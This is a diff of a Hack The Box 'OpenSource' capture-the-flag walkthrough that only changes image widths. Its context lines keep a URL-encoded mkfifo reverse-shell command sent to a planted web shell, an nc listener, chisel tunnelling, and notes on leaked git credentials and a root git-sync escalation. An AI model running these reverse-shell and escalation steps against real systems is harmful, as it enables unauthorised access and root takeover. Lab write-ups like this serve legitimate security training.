@@ -11,7 +11,7 @@ description: HTB - OpenSource walkthrough
 # OpenSource
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/banner.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/banner.png" width="70%"/>
 </p>
 
 
@@ -216,7 +216,7 @@ curl http://10.10.11.164/shell?k=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/6_0_in.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/6_0_in.png" width="70%"/>
 </p>
 
 We knew that the app was in docker so we land as root within the docker. There is not much within, so I remembered the port 3000 on the host, so let's use _chisel_ to check what's there.
@@ -240,7 +240,7 @@ chmod +x chisel
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/7_3_connected.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/7_3_connected.png" width="70%"/>
 </p>
 
 Once is set up, let's check the website:
@@ -262,13 +262,13 @@ First we can see the .git folder. These are the commands and the intentions behi
 We can see that they activated the debug option on the environment variables:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/1_2_git_dev.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/1_2_git_dev.png" width="70%"/>
 </p>
 
 Going down on the files at the _.gitignore changes_ commit we actually see the following credentials on the _.vscode_ settings file:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/1_3_git_leak.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/1_3_git_leak.png" width="70%"/>
 </p>
 
 
@@ -317,7 +317,7 @@ Now we can use it to SSH as dev01 into the machine:
 I loaded pspy32 into the machine and saw the _/usr/local/bin/git-sync_ command and the _git commit_ with a kind of backup running as root. 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/9_0_gitsync.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/9_0_gitsync.png" width="80%"/>
 </p>
 
 This git-sync has the following content:
@@ -361,7 +361,7 @@ nc -lvnp 5455
 And we are in after some minutes:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/opensource/10_root.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/opensource/10_root.png" width="95%"/>
 </p>
 
 
